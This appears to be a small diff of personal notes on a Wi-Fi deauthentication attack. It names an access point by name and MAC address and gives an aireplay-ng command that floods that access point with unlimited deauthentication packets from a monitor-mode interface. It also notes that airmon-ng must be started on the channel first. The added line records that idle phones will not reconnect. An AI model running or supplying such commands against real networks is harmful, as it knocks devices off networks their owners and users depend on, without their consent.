@@ -6,3 +6,5 @@ VOO-1KAHLD0:  00:CB:7A:76:21:50 1
 sudo aireplay-ng --deauth 0 -a 00:CB:7A:76:21:50 wlp0s20f3mon
 
 but first sudo airmon-ng start wlp0s20f3mon 'channel'
+
+IDLE phones won't reconnect to the network
